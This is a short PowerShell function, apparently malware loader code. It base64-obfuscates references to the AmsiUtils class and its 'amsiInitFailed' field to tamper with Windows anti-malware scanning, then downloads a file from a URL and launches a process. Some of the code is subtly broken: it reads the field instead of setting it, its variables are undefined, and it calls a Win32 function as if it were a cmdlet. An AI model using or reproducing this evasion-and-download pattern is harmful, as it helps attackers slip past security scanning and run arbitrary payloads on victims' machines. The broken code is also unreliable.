function StoredControl {
$t = [Ref].Assembly.GetType([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM='))).GetField([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('YW1zaUluaXRGYWlsZWQ=')), 'NonPublic,Static').GetValue($null)
$c = New-Object Net.WebClient
$c.DownloadFile($url,$file)
CreateProcessW($image)
}
